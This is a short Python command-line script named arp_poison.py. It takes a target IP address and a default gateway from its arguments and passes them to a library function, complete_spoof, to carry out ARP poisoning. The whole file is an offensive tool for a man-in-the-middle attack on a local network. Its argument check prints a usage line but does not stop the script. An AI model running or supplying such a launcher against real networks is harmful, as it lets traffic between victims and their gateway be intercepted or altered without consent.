from networklib.arpspoof import complete_spoof
import sys

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: arp_poison.py <target_ip> <default_gateway>")

    target_ip = sys.argv[1]
    default_gateway = sys.argv[2]
    complete_spoof(target_ip, default_gateway)
